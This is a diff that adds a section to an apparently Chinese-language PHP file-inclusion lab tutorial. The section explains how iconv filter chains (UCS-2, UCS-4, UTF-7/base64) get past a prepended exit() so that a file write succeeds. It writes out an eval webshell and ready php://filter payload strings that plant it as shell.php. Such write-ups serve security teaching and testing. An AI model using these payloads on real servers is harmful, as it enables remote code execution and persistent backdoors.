@@ -128,6 +128,19 @@ file_put_contents($_POST['filename'], $content); // User-controlled filename
     2.  如果服务器 PHP 配置中 `short_open_tag` 未开启，PHP 不会识别 `<?cuc` 作为代码起始标记，因此不会执行 `exit`。
     3.  后面被 ROT13 编码的 Webshell 也被写入文件。访问该文件时，如果能再用 `php://filter/read=string.rot13/resource=shell.php` 包含，就能执行。
 
+### 利用 `iconv`
+
+*   **原理**: 对于iconv字符编码转换进行绕过的手法，其实类似于上面所述的base64编码手段，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制exit;去除，而我们的恶意代码正常解码存储。
+*   **方法**: 通过UCS-2方式，对目标字符串进行2位一反转（这里的2LE和2BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-2中2的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了。
+*   **过程**:
+    1.  echo iconv("UCS-2LE","UCS-2BE",'<?php @eval($_POST[ab]);?>');
+    2.  php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php     ?<hp pe@av(l_$OPTSa[]b;)>?
+    3.  ?<hp pxeti)(p;ph/:f/liet/rocvnre.tcino.vCU-SL2.ECU-SB2|E<?php @eval($_POST[ab]);?>r/seuocr=ehsle.lhp
+*   **注**: 
+    usc-4:php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?<e@ p(lavOP_$a[TS]dcb>?;)/resource=shell.php
+    utf8-utf7:php://filter/write=aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php
+---
+
 ---
 
 ## Level 4: 日志文件包含 (Log File Inclusion)
